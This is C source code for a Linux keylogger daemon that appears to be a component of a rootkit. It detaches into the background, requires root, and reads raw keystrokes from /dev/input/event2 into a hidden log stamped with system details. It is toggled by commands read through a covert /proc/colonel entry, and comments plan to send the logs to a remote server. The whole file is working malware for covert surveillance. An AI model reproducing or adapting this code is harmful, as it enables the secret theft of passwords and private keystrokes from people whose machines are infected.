// REMOVE PRINTF WHEN DONE
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <linux/input.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>


int main(void) {
	FILE *fp = NULL;
	FILE *evlog;
	int ftty;
	int fd;
	int dir;
	struct utsname unameData;
	uname(&unameData);
	char listening = 0;
	char cmd[1024];
	char kl[13] = "keylogger: 1";
	char *toggle;
	struct input_event ev;			/* using input_event so we know 
									 * what we're reading from the 
									 * event file */
	pid_t process_id = 0;
	pid_t sid = 0;
	process_id = fork();			/* fork a child process */

	if (process_id < 0) {
		printf("ERROR: fork failure\n");
		exit(1);
	}
	if (process_id > 0) {
		// REMOVE printf WHEN DONE
		printf("process_id of child process %d\n", process_id);
		exit(0);
	}

	umask(0);						/* unmask the file mode */
	sid = setsid();					/* set unique session for 
									 * child process */
	if (sid < 0) {
		exit(1);
	}

	// chdir("/opt/");					/* change daemon working directory */

	close(STDIN_FILENO);
	close(STDOUT_FILENO);
	close(STDERR_FILENO);

// MAKE ALL FILES AND DIRECTORIES WITH PREFIX RT !!!!!!!!!!
	dir = mkdir("./log", S_IRWXU);				/* log directory */
	fp = fopen("./log/log.txt", "a+"); 			/* daemon log */
	evlog = fopen("./log/evlog.txt", "a+");  	/* key log */
	fd = open("/dev/input/event2", O_RDONLY);	/* key event file */
	// ftty = open("/proc/colonel", O_RDONLY);		/* will act as pseudo terminal */
	
	time_t curtime;
	time(&curtime);
	if (!ftty) {
		fprintf(fp, "ERROR: /proc/colonel not found -- %s", ctime(&curtime));
		return 1;
	}
	// findev = open('/proc/bus/input/devices', O_RDONLY);
/*
* DYNAMICALLY DISCOVER CORRECT EVENT (/proc/bus/input/devices) 327
* Send file out via libcurl to python server for translation
*/	
	if (geteuid() != 0) {							/* check if user is root */
		fprintf(fp, "ERROR: user not root -- %s", ctime(&curtime));
		return 1;
	}
	if (NULL == evlog) {
		fprintf(fp, "ERROR: evlog couldn't be opened -- %s", ctime(&curtime));
		return 1;
	}

	fprintf(evlog, "\n\n%s", ctime(&curtime));		/* timestamp */
	fprintf(evlog, "%s\n%s\n%s | %s | %s\n\n-", 	/* system data */
			unameData.nodename, unameData.version,
			unameData.sysname, unameData.release, 
			unameData.machine);
	fflush(evlog);

	/* grabs keyboard input -- ev.code = keycode, ev.value = key state (0: up, 1: down)*/
	while(1) {
		fflush(fp);
		read(fd, &ev, sizeof(struct input_event));		/* read from /dev/input/eventX */
		ftty = open("/proc/colonel", O_RDONLY);			/* read from /proc/colonel */
		if (0 == listening) {
			read(ftty, cmd, sizeof(cmd));				/* read from /proc/colonel */
			toggle = strstr(cmd, kl);					/* looks for change in /proc/colonel */
			fprintf(fp, "KEYTOGGLE: %s\n", toggle);
			if (toggle != NULL) {
				fprintf(fp, "In strncmp if listening: %d, cmd: %c\n", listening, cmd[strlen(cmd)-5]);
				listening = !listening;
				fprintf(fp, "listening: %d -- %s", listening, ctime(&curtime));
				close(ftty);
				continue;
			}

		} else if ((1 == ev.type) && (1 == listening)) {
			fprintf(evlog, "%i,%i-", ev.code, ev.value);
			fflush(evlog);

			fprintf(fp, "In 2nd if statement listening: %d\n", listening);
			ftty = open("/proc/colonel", O_RDONLY | O_NONBLOCK);
			read(ftty, cmd, sizeof(cmd));
			toggle = strstr(cmd, kl);
			if (NULL == toggle) {
				listening = !listening;
				close(ftty);
				continue;
			}
		}
	}

	fclose(evlog);
	fclose(fp);
	return 0;
}